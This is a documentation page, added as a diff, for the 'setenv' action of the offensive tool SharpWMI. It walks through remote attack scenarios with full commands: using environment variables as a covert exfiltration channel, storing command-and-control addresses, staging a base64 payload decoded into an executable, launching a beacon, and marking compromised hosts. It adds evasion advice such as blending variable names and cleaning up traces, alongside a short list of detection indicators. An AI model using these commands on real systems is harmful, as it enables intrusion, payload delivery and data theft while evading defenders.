@@ -1,0 +1,276 @@
+---
+title: 'setenv'
+description: 'Set environment variable values on local and remote systems'
+icon: 'pencil'
+---
+
+## Overview
+
+The `setenv` action creates or modifies environment variables on local and remote systems using the `Win32_Environment` WMI class. It can be used for configuration, data storage, or as a covert communication channel.
+
+## Syntax
+
+```bash
+SharpWMI.exe action=setenv name=VARIABLE_NAME value=VARIABLE_VALUE [computername=HOST[,HOST2,...]] [username=DOMAIN\user] [password=Password]
+```
+
+## Parameters
+
+| Parameter | Required | Description |
+|-----------|----------|-------------|
+| `action` | Yes | Must be `setenv` |
+| `name` | Yes | Environment variable name |
+| `value` | Yes | Environment variable value |
+| `computername` | No | Target host(s), comma-separated. Defaults to localhost |
+| `username` | No | Username for authentication |
+| `password` | No | Password for authentication |
+
+## Usage Examples
+
+<CodeGroup>
+```bash Set Local Variable
+SharpWMI.exe action=setenv name=TEST value="Hello World"
+```
+
+```bash Set Remote Variable
+SharpWMI.exe action=setenv name=CONFIG value="ProductionServer" computername=target.domain.com
+```
+
+```bash With Credentials
+SharpWMI.exe action=setenv name=API_KEY value="abc123xyz" computername=target.domain.com username="DOMAIN\admin" password="Password123!"
+```
+
+```bash Multiple Targets
+SharpWMI.exe action=setenv name=BUILD_NUMBER value="1234" computername=server1,server2,server3
+```
+</CodeGroup>
+
+## Operational Use Cases
+
+### Scenario 1: Data Exfiltration Channel
+
+```bash
+# 1. Execute command and store result
+SharpWMI.exe action=exec computername=target command="whoami /all > C:\temp\out.txt" result=true
+
+# 2. Read file content and store in variable (via PowerShell)
+SharpWMI.exe action=exec computername=target command="powershell -c \"$c=Get-Content C:\temp\out.txt -Raw; [Environment]::SetEnvironmentVariable('RESULT',$c,'User')\"" result=true
+
+# 3. Retrieve stored data
+SharpWMI.exe action=getenv name=RESULT computername=target
+
+# 4. Clean up
+SharpWMI.exe action=delenv name=RESULT computername=target
+```
+
+### Scenario 2: Configuration Management
+
+```bash
+# Set configuration for payload
+SharpWMI.exe action=setenv name=C2_SERVER value="192.168.1.100" computername=target.domain.com
+SharpWMI.exe action=setenv name=C2_PORT value="443" computername=target.domain.com
+
+# Payload reads these variables at runtime
+```
+
+### Scenario 3: Staging Data
+
+```bash
+# Store encoded payload in environment variable
+SharpWMI.exe action=setenv name=PAYLOAD value="<base64_encoded_data>" computername=target.domain.com
+
+# Execute decoder that reads from environment
+SharpWMI.exe action=exec computername=target command="powershell -c \"$p=[Environment]::GetEnvironmentVariable('PAYLOAD','User'); $b=[Convert]::FromBase64String($p); [IO.File]::WriteAllBytes('C:\temp\file.exe',$b)\""
+```
+
+### Scenario 4: Persistence Marker
+
+```bash
+# Set marker to indicate compromised system
+SharpWMI.exe action=setenv name=SYSTEM_ID value="<unique_identifier>" computername=target.domain.com
+
+# Check marker on revisit
+SharpWMI.exe action=getenv name=SYSTEM_ID computername=target.domain.com
+```
+
+## Variable Scope
+
+Environment variables are set in the **user context**:
+
+- **System scope:** Requires SYSTEM privileges
+- **User scope:** Current user or specified user
+- **Volatile:** Temporary (lost on reboot)
+
+<Note>
+  SharpWMI sets variables in the user scope by default. The variable persists across sessions but not reboots unless explicitly set as system-level.
+</Note>
+
+## Remote vs Local Usage
+
+<Tabs>
+  <Tab title="Local Set">
+    ```bash
+    SharpWMI.exe action=setenv name=TEST value="VALUE"
+    ```
+
+    **Use for:**
+    - Local configuration
+    - Testing
+    - Post-exploitation setup
+  </Tab>
+
+  <Tab title="Remote Set">
+    ```bash
+    SharpWMI.exe action=setenv name=TEST value="VALUE" computername=target.domain.com
+    ```
+
+    **Use for:**
+    - Remote configuration
+    - Data staging
+    - Covert channels
+  </Tab>
+</Tabs>
+
+## Detection Considerations
+
+<AccordionGroup>
+  <Accordion title="WMI Detection" icon="radar">
+    - Win32_Environment class modifications
+    - Event ID 5857: WMI activity
+    - Sysmon Event ID 19-21: WMI operations
+    - Environment variable creation/modification
+  </Accordion>
+
+  <Accordion title="Registry Detection" icon="database">
+    - Registry modifications in environment key
+    - `HKCU\Environment` changes
+    - `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment` changes
+    - Event ID 4657: Registry value modification
+  </Accordion>
+
+  <Accordion title="Suspicious Variables" icon="magnifying-glass">
+    - Unusual variable names
+    - Large variable values
+    - Base64-encoded content
+    - Variables created by non-standard processes
+  </Accordion>
+</AccordionGroup>
+
+## Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Variable Naming" icon="tag">
+    - Use legitimate-sounding names
+    - Blend with existing variables
+    - Avoid obvious malicious names
+    - Examples: BUILD_CONFIG, SYSTEM_ID, CACHE_PATH
+  </Card>
+
+  <Card title="Operational Security" icon="user-secret">
+    - Clean up variables after use
+    - Don't store sensitive data in plaintext
+    - Use encoding/encryption
+    - Monitor for defensive responses
+  </Card>
+
+  <Card title="Data Management" icon="database">
+    - Keep values reasonably sized
+    - Don't exceed value length limits
+    - Consider compression for large data
+    - Use delenv to clean up
+  </Card>
+
+  <Card title="Persistence" icon="clock">
+    - Variables persist across logons
+    - Lost on system reboot
+    - Not suitable for long-term storage
+    - Consider scheduled task for persistence
+  </Card>
+</CardGroup>
+
+## Value Length Limits
+
+<Warning>
+  Environment variable values have length limitations. Very large values may fail to set.
+</Warning>
+
+**Recommendations:**
+- Keep values under 32KB
+- Use compression for large data
+- Split large data across multiple variables
+- Test with small values first
+
+## Troubleshooting
+
+<AccordionGroup>
+  <Accordion title="Access Denied">
+    **Cause:** Insufficient privileges
+
+    **Solution:**
+    - Use `username` and `password` parameters
+    - Verify admin rights on target
+    - Check UAC remote restrictions
+  </Accordion>
+
+  <Accordion title="Value Not Set">
+    **Cause:** WMI operation failed
+
+    **Solution:**
+    - Check value length
+    - Verify WMI service is running
+    - Try with shorter value
+    - Check for special characters
+  </Accordion>
+
+  <Accordion title="Variable Not Visible">
+    **Cause:** Scope or context issue
+
+    **Solution:**
+    - Variables are user-specific
+    - Check with getenv action
+    - May need to refresh environment
+    - Verify correct username context
+  </Accordion>
+</AccordionGroup>
+
+## Related Actions
+
+<CardGroup cols={2}>
+  <Card title="getenv" icon="eye" href="/ghostpack-docs/SharpWMI-mdx/actions/getenv">
+    Retrieve environment variables
+  </Card>
+  <Card title="delenv" icon="trash" href="/ghostpack-docs/SharpWMI-mdx/actions/delenv">
+    Delete environment variables
+  </Card>
+  <Card title="exec" icon="terminal" href="/ghostpack-docs/SharpWMI-mdx/actions/exec">
+    Execute commands that use variables
+  </Card>
+  <Card title="query" icon="database" href="/ghostpack-docs/SharpWMI-mdx/actions/query">
+    Custom WMI queries
+  </Card>
+</CardGroup>
+
+## Examples with Execution
+
+<Accordion title="Set and Use Variable">
+  ```bash
+  # 1. Set environment variable
+  SharpWMI.exe action=setenv name=C2_ADDR value="192.168.1.100" computername=target
+
+  # 2. Execute payload that reads variable
+  SharpWMI.exe action=exec computername=target command="powershell -c \"$ip=[Environment]::GetEnvironmentVariable('C2_ADDR','User'); beacon.exe -c $ip\""
+
+  # 3. Clean up
+  SharpWMI.exe action=delenv name=C2_ADDR computername=target
+  ```
+</Accordion>
+
+<Accordion title="Store Command Output">
+  ```bash
+  # Using PowerShell to capture and store output
+  SharpWMI.exe action=exec computername=target command="powershell -c \"$o=whoami /all | Out-String; [Environment]::SetEnvironmentVariable('WHOAMI_OUTPUT',$o,'User')\"" result=true
+
+  # Retrieve stored output
+  SharpWMI.exe action=getenv name=WHOAMI_OUTPUT computername=target
+  ```
+</Accordion>
